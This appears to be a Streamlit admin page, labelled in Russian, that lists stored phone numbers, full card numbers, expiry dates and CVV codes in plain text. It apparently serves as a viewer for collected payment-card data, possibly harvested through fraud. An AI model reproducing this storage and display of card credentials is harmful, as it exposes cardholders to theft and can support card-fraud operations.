from database.models.task import Task
import streamlit as st
import pandas as pd

st.set_page_config(page_title="💳 Карты", layout="wide")
st.title("💳 Карты")

rows = Task.all()

st.caption(f"Всего записей: {len(rows)}")

if not rows:
    st.info("Пока нет данных")
else:
    data = [{
        "ID": t.id,
        "Создано": t.created_at,
        "Телефон": t.phone_number or "",
        "Номер карты": t.card_number or "",
        "Срок": t.card_date or "",
        "CVV": t.card_cvv or "",
    } for t in rows]
    
    df = pd.DataFrame(data)
    st.dataframe(df, use_container_width=True, hide_index=True)
